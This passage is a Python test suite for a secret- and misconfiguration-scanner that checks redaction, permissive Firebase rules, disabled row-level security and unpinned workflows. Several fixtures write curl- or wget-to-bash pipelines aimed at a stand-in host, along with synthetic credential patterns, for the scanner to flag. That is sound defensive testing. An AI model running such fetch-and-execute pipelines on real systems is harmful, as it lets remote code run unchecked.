from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import types
import unittest
from unittest import mock


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
SCANNER = REPOSITORY_ROOT / "skill" / "vibeworthy" / "scripts" / "preflight.py"


def load_scanner_module() -> types.ModuleType:
    module_name = "vibeworthy_preflight_test_module"
    specification = importlib.util.spec_from_file_location(module_name, SCANNER)
    if specification is None or specification.loader is None:
        raise RuntimeError("scanner module could not be loaded")
    module = importlib.util.module_from_spec(specification)
    sys.modules[module_name] = module
    specification.loader.exec_module(module)
    return module


def synthetic_cloud_key() -> str:
    return ("AK" + "IA") + ("Q" * 16)


def synthetic_firebase_key() -> str:
    return ("AI" + "za") + ("A" * 35)


def synthetic_supabase_key(kind: str) -> str:
    return "sb_" + kind + "_" + ("b" * 28)


def synthetic_jwt(role: str) -> str:
    def segment(value: dict[str, str]) -> str:
        encoded = base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode("utf-8"))
        return encoded.decode("ascii").rstrip("=")

    return ".".join((segment({"alg": "HS256", "typ": "JWT"}), segment({"role": role}), "signaturesegment"))


def tree_digest(root: Path) -> dict[str, tuple[str, str]]:
    result: dict[str, tuple[str, str]] = {}
    for current, directories, files in os.walk(root, topdown=True, followlinks=False):
        directories.sort()
        files.sort()
        current_path = Path(current)
        for name in list(directories) + files:
            path = current_path / name
            relative = path.relative_to(root).as_posix()
            if path.is_symlink():
                result[relative] = ("symlink", os.readlink(path))
            elif path.is_file():
                result[relative] = ("file", hashlib.sha256(path.read_bytes()).hexdigest())
            elif path.is_dir():
                result[relative] = ("directory", "")
    return result


class RepositoryFixture:
    def __init__(self, case: unittest.TestCase, *, git: bool = True) -> None:
        self._temporary = tempfile.TemporaryDirectory()
        case.addCleanup(self._temporary.cleanup)
        self.base = Path(self._temporary.name)
        self.root = self.base / "project"
        self.root.mkdir()
        if git:
            subprocess.run(
                ["git", "init", "-q", str(self.root)],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
            )

    def write(self, relative: str, content: str | bytes) -> Path:
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def track(self, *relative_paths: str, force: bool = False) -> None:
        command = ["git", "add"]
        if force:
            command.append("--force")
        command.extend(("--", *relative_paths))
        subprocess.run(
            command,
            cwd=self.root,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )


class PreflightTests(unittest.TestCase):
    maxDiff = None

    def run_scanner(
        self,
        target: Path,
        output_format: str = "json",
        *extra: str,
    ) -> subprocess.CompletedProcess[str]:
        environment = os.environ.copy()
        environment["PYTHONDONTWRITEBYTECODE"] = "1"
        return subprocess.run(
            [sys.executable, str(SCANNER), str(target), "--format", output_format, *extra],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

    def json_report(self, completed: subprocess.CompletedProcess[str]) -> dict[str, object]:
        self.assertEqual("", completed.stderr)
        return json.loads(completed.stdout)

    def test_req_010_all_formats_are_parseable_deterministic_and_read_only(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "# Synthetic clean project\n")
        fixture.track("README.md")
        before = tree_digest(fixture.root)

        first_json = self.run_scanner(fixture.root, "json")
        second_json = self.run_scanner(fixture.root, "json")
        text = self.run_scanner(fixture.root, "text")
        sarif = self.run_scanner(fixture.root, "sarif")

        self.assertEqual(0, first_json.returncode)
        self.assertEqual(first_json.stdout, second_json.stdout)
        report = self.json_report(first_json)
        self.assertEqual("1.0", report["schema_version"])
        self.assertEqual(0, report["exit_code"])
        self.assertEqual("none", report["release_assertion"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertFalse(report["scope"]["submodules_scanned"])
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

        self.assertEqual(0, text.returncode)
        self.assertIn("Git history and submodule contents were not scanned", text.stdout)
        self.assertIn("it is not GO", text.stdout)
        self.assertEqual("", text.stderr)

        self.assertEqual(0, sarif.returncode)
        sarif_document = json.loads(sarif.stdout)
        self.assertEqual("2.1.0", sarif_document["version"])
        self.assertEqual(0, sarif_document["runs"][0]["invocations"][0]["exitCode"])
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_007_matched_secret_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        fixture.write("config.txt", f'access_token = "{synthetic_value}"\n')
        fixture.track("config.txt")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("VW-SECRET-CLOUD-ACCESS-KEY", completed.stdout)
                self.assertIn("config.txt", completed.stdout)
                self.assertIn("rotate", completed.stdout.lower())

    def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "!DUMMY_SECRET_VALUE_123"
        filename = f"token={synthetic_value}"
        fixture.write(filename, f"token={synthetic_value}\n")

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(1, completed.returncode)
                self.assertNotIn(synthetic_value, completed.stdout)
                self.assertNotIn(synthetic_value, completed.stderr)
                self.assertIn("REDACTED", completed.stdout)

    def test_req_007_specialized_secret_filenames_are_redacted_in_every_format(self) -> None:
        cases = (
            ("NEXT_PUBLIC_ADMIN_KEY", "VW-CLIENT-PRIVILEGED-CREDENTIAL"),
            ("SUPABASE_SERVICE_ROLE_KEY", "VW-SUPABASE-PRIVILEGED-KEY"),
        )
        for variable_name, rule_id in cases:
            with self.subTest(variable_name=variable_name):
                fixture = RepositoryFixture(self)
                synthetic_value = "!PrivilegedSyntheticValue123456789"
                fixture.write(
                    f"{variable_name}={synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )
                fixture.write(
                    f"{variable_name}=/{synthetic_value}",
                    f"{variable_name}={synthetic_value}\n",
                )

                for output_format in ("text", "json", "sarif"):
                    with self.subTest(output_format=output_format):
                        completed = self.run_scanner(fixture.root, output_format)
                        self.assertEqual(1, completed.returncode)
                        self.assertNotIn(synthetic_value, completed.stdout)
                        self.assertNotIn(synthetic_value, completed.stderr)
                        self.assertIn(rule_id, completed.stdout)
                        self.assertIn("REDACTED", completed.stdout)

    def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
        fixture = RepositoryFixture(self)
        format_control = "\u202e"
        firebase = synthetic_firebase_key()
        fixture.write(f"safe{format_control}.js", f'const firebaseApiKey = "{firebase}";\n')

        for output_format in ("text", "json", "sarif"):
            with self.subTest(output_format=output_format):
                completed = self.run_scanner(fixture.root, output_format)
                self.assertEqual(0, completed.returncode)
                self.assertNotIn(format_control, completed.stdout)
                self.assertIn("202e", completed.stdout.lower())

    def test_req_011_git_scope_env_and_skip_reasons(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = synthetic_cloud_key()
        fixture.write(".gitignore", ".env.local\n")
        fixture.write(".env", "SAFE_NAME=placeholder\n")
        fixture.write(".env.local", f"IGNORED={synthetic_value}\n")
        fixture.write(".env.example", "TOKEN=placeholder\n")
        fixture.write("src/new.txt", "ordinary untracked source\n")
        fixture.write("vendor/dependency.txt", f"TOKEN={synthetic_value}\n")
        fixture.write("dist/bundle.js", f"TOKEN={synthetic_value}\n")
        fixture.write("asset.bin", b"\x00" + synthetic_value.encode("ascii"))
        fixture.write("large.txt", ("x" * 300) + synthetic_value)
        outside = fixture.base / "outside.txt"
        outside.write_text(f"TOKEN={synthetic_value}\n", encoding="utf-8")
        (fixture.root / "linked.txt").symlink_to(outside)
        fixture.track(".gitignore", ".env.example", "src/new.txt")
        fixture.track(".env", force=True)

        before = tree_digest(fixture.root)
        completed = self.run_scanner(fixture.root, "json", "--max-file-bytes", "128")
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = report["findings"]
        by_rule = {finding["rule_id"]: finding for finding in findings}
        self.assertIn("VW-ENV-TRACKED", by_rule)
        self.assertEqual(".env", by_rule["VW-ENV-TRACKED"]["path"])
        reported_paths = {finding["path"] for finding in findings}
        self.assertNotIn(".env.local", reported_paths)
        self.assertNotIn(".env.example", reported_paths)
        self.assertNotIn("vendor/dependency.txt", reported_paths)
        self.assertNotIn("dist/bundle.js", reported_paths)
        self.assertNotIn("asset.bin", reported_paths)
        self.assertNotIn("large.txt", reported_paths)
        self.assertNotIn("linked.txt", reported_paths)
        skipped = report["summary"]["skipped_by_reason"]
        self.assertGreaterEqual(skipped["binary"], 1)
        self.assertGreaterEqual(skipped["generated-or-vendor"], 2)
        self.assertGreaterEqual(skipped["oversized"], 1)
        self.assertGreaterEqual(skipped["symlink"], 1)
        self.assertNotIn(synthetic_value, completed.stdout)
        self.assertEqual(before, tree_digest(fixture.root))

    def test_req_011_untracked_nonignored_env_is_distinct_from_template(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(".env.production", "VALUE=placeholder\n")
        fixture.write(".env.template", "VALUE=placeholder\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        env_findings = [finding for finding in report["findings"] if finding["rule_id"].startswith("VW-ENV-")]
        self.assertEqual(1, len(env_findings))
        self.assertEqual("VW-ENV-UNIGNORED", env_findings[0]["rule_id"])
        self.assertEqual(".env.production", env_findings[0]["path"])

    def test_req_008_contextual_backend_keys_and_privileged_key(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        publishable = synthetic_supabase_key("publishable")
        privileged = synthetic_supabase_key("secret")
        fixture.write(
            "src/config.ts",
            "\n".join(
                (
                    f'export const firebaseApiKey = "{firebase}";',
                    f'export const supabasePublishable = "{publishable}";',
                    f'const backendCredential = "{privileged}";',
                    "",
                )
            ),
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-FIREBASE-PUBLIC-API-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PUBLIC-KEY", rule_ids)
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertEqual(2, report["summary"]["required_manual_checks"])
        for value in (firebase, publishable, privileged):
            self.assertNotIn(value, completed.stdout)
        firebase_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        )
        self.assertIn("external", firebase_finding["message"])
        self.assertIn("unverified", firebase_finding["message"])

    def test_req_008_legacy_supabase_roles_are_classified_without_echoing_jwt(self) -> None:
        fixture = RepositoryFixture(self)
        public_jwt = synthetic_jwt("anon")
        privileged_jwt = synthetic_jwt("service_role")
        fixture.write("keys.txt", f"anon={public_jwt}\nservice={privileged_jwt}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertEqual(
            {"VW-SUPABASE-PUBLIC-KEY", "VW-SUPABASE-PRIVILEGED-KEY"},
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(public_jwt, completed.stdout)
        self.assertNotIn(privileged_jwt, completed.stdout)

    def test_req_008_permissive_firebase_rules_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "rules_version = '2';\nservice cloud.firestore { match /{document=**} { allow read, write: if true; } }\n",
        )
        fixture.write("database.rules.json", '{"rules": {".read": true, ".write": "true"}}\n')
        fixture.write("database-tautology.rules", '{"rules": {".read": "true == true"}}\n')
        fixture.write(
            "storage.rules",
            "service firebase.storage { match /b/{bucket}/o { match /{allPaths=**} { "
            "allow read, write: if\n true; } } }\n",
        )
        fixture.write(
            "tautology.rules",
            "service cloud.firestore { match /{document=**} { allow read: if true == true; } }\n",
        )
        fixture.write(
            "double-negation.rules",
            "service cloud.firestore { match /{document=**} { allow read: if !!true; } }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
        self.assertEqual(6, len(rule_findings))
        self.assertEqual(
            {
                "database-tautology.rules",
                "database.rules.json",
                "double-negation.rules",
                "firestore.rules",
                "storage.rules",
                "tautology.rules",
            },
            {finding["path"] for finding in rule_findings},
        )

    def test_req_008_firebase_tautology_scan_is_bounded_on_long_failure(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(
            Path("firestore.rules"),
            "firestore.rules",
            None,
            b"firestore.rules",
        )
        text = "allow read: if true" + (" " * 65_536) + "X"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 1.0, f"Firebase rule scan took {elapsed:.3f}s")
        self.assertEqual([], findings)

    def test_req_008_firebase_whitespace_cannot_bypass_permissive_rule_scan(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "firestore.rules",
            "allow" + (" " * 65) + "read: if true;\n"
            "allow read: if true" + (" " * 513) + ";\n",
        )
        fixture.write(
            "database.rules.json",
            '{"rules": {".read"' + (" " * 65) + ": true}}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(3, len(findings))

    def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "supabase/migrations/001_access.sql",
            "ALTER TABLE public.accounts\n  DISABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;\n"
            "ALTER TABLE public.profiles FORCE ROW LEVEL SECURITY;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rls_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-RLS-DISABLED"]
        self.assertEqual(1, len(rls_findings))
        self.assertEqual("supabase/migrations/001_access.sql", rls_findings[0]["path"])
        self.assertEqual(1, rls_findings[0]["line"])

    def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "private": True,
                    "scripts": {"postinstall": "node verify-install.js"},
                    "dependencies": {"left-pad": "1.3.0"},
                },
                indent=2,
            )
            + "\n",
        )
        fixture.write("package-lock.json", "{}\n")
        fixture.write("yarn.lock", "# synthetic\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-CONFLICT", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertNotIn("VW-LOCKFILE-MISSING", rule_ids)

    def test_req_009_missing_lock_and_remote_install_are_reported(self) -> None:
        fixture = RepositoryFixture(self)
        remote_command = (
            ("cu" + "rl")
            + " https://invalid.example/tool "
            + "|"
            + " /bin/"
            + ("ba" + "sh")
        )
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "scripts": {"install": remote_command},
                    "dependencies": {"package": "1.0.0"},
                },
                indent=2,
            )
            + "\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-MISSING", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)

    def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        first_fetcher = "cu" + "rl"
        second_fetcher = "wg" + "et"
        shell = "ba" + "sh"
        fixture.write(
            "install.sh",
            f"{first_fetcher} https://invalid.example/one | env {shell}\n"
            f"{second_fetcher} https://invalid.example/two |\n {shell}\n"
            f"{first_fetcher} https://invalid.example/three | command {shell}\n"
            f"{second_fetcher} https://invalid.example/four | \\\n {shell}\n"
            f"{first_fetcher} 'https://invalid.example/five?a=1&b=2' | {shell}\n"
            f"{second_fetcher} https://invalid.example/six | sudo -u root {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual(6, len(findings))
        self.assertEqual({1, 2, 4, 5, 7, 8}, {finding["line"] for finding in findings})

    def test_req_009_nested_fragment_and_windows_remote_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "nested.sh",
            f"{fetcher} https://invalid.example/install#fragment | {shell}\n"
            f"sh -c '{fetcher} https://invalid.example/install | {shell}'\n"
            f'result="$({fetcher} https://invalid.example/install | {shell})"\n'
            f"{fetcher}.exe https://invalid.example/install | {shell}.exe\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4}, {finding["line"] for finding in findings})

    def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "download.sh",
            f"{fetcher} -o tool https://invalid.example/tool\n"
            f"printf safe | {shell}\n"
            f"{fetcher} is only a word in this prose.\n"
            f"echo local | {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertNotIn(
            "VW-REMOTE-INSTALL-SCRIPT",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_shell_tokenization_budget_is_bounded_and_fails_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write("long-unclosed.txt", f'{fetcher} "' + ("x" * 50_000) + "\n")
        fixture.write(
            "long-pipeline.txt",
            f"{fetcher} " + ("x" * 5_000) + f" | {shell}\n",
        )
        fixture.write("malformed-pipeline.txt", f'{fetcher} "unclosed | {shell}\n')

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        elapsed = time.perf_counter() - started
        report = self.json_report(completed)

        self.assertLess(elapsed, 3.0, f"bounded shell scan took {elapsed:.3f}s")
        self.assertEqual(1, completed.returncode)
        unparsed = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        ]
        self.assertEqual(
            {"long-pipeline.txt", "malformed-pipeline.txt"},
            {finding["path"] for finding in unparsed},
        )

    def test_req_009_plain_megabyte_scan_is_linear(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("plain.txt", "!" * 1_048_576)

        scanner = load_scanner_module()
        started = time.perf_counter()
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers("!" * 1_048_576))
        direct_elapsed = time.perf_counter() - started

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        scan_elapsed = time.perf_counter() - started

        self.assertLess(direct_elapsed, 1.0, f"direct shell scan took {direct_elapsed:.3f}s")
        self.assertLess(scan_elapsed, 3.0, f"full scanner took {scan_elapsed:.3f}s")
        self.assertEqual(0, completed.returncode)

    def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            ".github/workflows/release.yml",
            "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@"
            + ("a" * 40)
            + "\n  - { uses: owner/flow-action@v4 }\n"
            + "  - { 'uses': 'owner/quoted-action@v4' }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        action_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-AUTOMATION-UNPINNED"]
        self.assertEqual(3, len(action_findings))
        self.assertEqual({2, 4, 5}, {finding["line"] for finding in action_findings})

    def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
        fixture.write("config.txt", f"password={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_009_realistic_secret_with_placeholder_prefix_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        synthetic_value = "test-" + "RealisticCredential1234"
        fixture.write("config.txt", f"{assignment_name}={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
    def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")
        fixture.track("README.md")
        marker = fixture.base / "fsmonitor-executed"
        hook = fixture.root / ".git" / "hooks" / "synthetic-fsmonitor"
        hook.write_text(
            "#!/bin/sh\nprintf executed > " + str(marker) + "\nexit 0\n",
            encoding="utf-8",
        )
        hook.chmod(0o700)
        subprocess.run(
            ["git", "config", "core.fsmonitor", str(hook)],
            cwd=fixture.root,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertFalse(marker.exists())
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

    def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        candidate_path = fixture.write("safe/data.txt", "ordinary inside content\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "data.txt").write_text(outside_value, encoding="utf-8")
        original_open = scanner.os.open
        swapped = False

        def swapping_open(path: object, flags: int, *args: object, **kwargs: object) -> int:
            nonlocal swapped
            if not swapped and Path(path) == candidate_path:
                swapped = True
                safe_directory = fixture.root / "safe"
                safe_directory.rename(fixture.root / "safe-original")
                safe_directory.symlink_to(outside_directory, target_is_directory=True)
            return original_open(path, flags, *args, **kwargs)

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "safe/data.txt", None)
        with mock.patch.object(scanner.os, "open", side_effect=swapping_open):
            result = scanner._read_candidate(candidate, fixture.root, False, 1024, report)

        self.assertIsNone(result)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        rendered = scanner.render_json(report)
        self.assertNotIn(outside_value, rendered)

    def test_req_011_complete_distinct_approver_warning_suppression(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted in console" '
            'owner="app-team" approved-by="security-team" '
            'compensating-control="deny by default rules" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual(1, len(report["findings"]))
        finding = report["findings"][0]
        self.assertTrue(finding["suppressed"])
        self.assertTrue(finding["suppression"]["metadata_complete"])
        self.assertTrue(finding["suppression"]["approver_identifier_distinct"])
        self.assertFalse(finding["suppression"]["approver_independence_verified"])
        self.assertTrue(finding["suppression"]["values_redacted"])
        self.assertEqual(1, report["summary"]["suppressed_warnings"])
        self.assertEqual(1, report["summary"]["required_manual_checks"])
        self.assertNotIn(firebase, completed.stdout)
        self.assertNotIn("app-team", completed.stdout)
        self.assertNotIn("security-team", completed.stdout)

    def test_req_011_incomplete_same_owner_or_expired_suppression_fails(self) -> None:
        cases = (
            'reason="reviewed" owner="same" approved-by="same" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app-team" approved-by="app\u200b-team" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="security" compensating-control="rules" expires="2000-01-01"',
            'reason="reviewed" owner="app" approved-by="security" expires="2099-01-01"',
        )
        for metadata in cases:
            with self.subTest(metadata=metadata):
                fixture = RepositoryFixture(self)
                firebase = synthetic_firebase_key()
                fixture.write(
                    "config.js",
                    f'const firebaseApiKey = "{firebase}"; // vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}\n',
                )
                completed = self.run_scanner(fixture.root)
                report = self.json_report(completed)
                self.assertEqual(1, completed.returncode)
                rule_ids = {finding["rule_id"] for finding in report["findings"]}
                self.assertIn("VW-SUPPRESSION-INVALID", rule_ids)
                public_finding = next(
                    finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
                )
                self.assertFalse(public_finding["suppressed"])
                self.assertNotIn(firebase, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Backslash is a path separator on Windows")
    def test_req_011_display_path_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write("a/b.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
        fixture.write(r"a\b.js", f'const firebaseApiKey = "{firebase}";\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))

    def test_req_011_redacted_filename_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        assignment_name = "to" + "ken"
        first_secret = "First" + "SyntheticSecret1234"
        second_secret = "Second" + "SyntheticSecret5678"
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write(
            f"{assignment_name}={first_secret}",
            f'const firebaseApiKey = "{firebase}"; // {marker}\n',
        )
        fixture.write(
            f"{assignment_name}={second_secret}",
            f'const firebaseApiKey = "{firebase}";\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))
        self.assertTrue(
            all("__vibeworthy_redacted_path_" in finding["path"] for finding in findings)
        )
        self.assertNotIn(first_secret, completed.stdout)
        self.assertNotIn(second_secret, completed.stdout)

    def test_req_011_blocker_cannot_be_suppressed(self) -> None:
        fixture = RepositoryFixture(self)
        privileged = synthetic_supabase_key("secret")
        marker = (
            'vibeworthy:ignore VW-SUPABASE-PRIVILEGED-KEY reason="accepted" '
            'owner="app" approved-by="security" compensating-control="server only" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const backendCredential = "{privileged}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertIn("VW-SUPPRESSION-BLOCKER", rule_ids)
        privileged_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-PRIVILEGED-KEY"
        )
        self.assertFalse(privileged_finding["suppressed"])
        self.assertNotIn(privileged, completed.stdout)

    def test_req_010_usage_and_tool_failures_return_two_as_structured_output(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")

        invalid_limit = self.run_scanner(fixture.root, "json", "--max-file-bytes", "0")
        invalid_report = self.json_report(invalid_limit)
        self.assertEqual(2, invalid_limit.returncode)
        self.assertEqual(2, invalid_report["exit_code"])
        self.assertEqual("usage.invalid-arguments", invalid_report["tool_errors"][0]["code"])

        missing = self.run_scanner(fixture.root / "missing", "sarif")
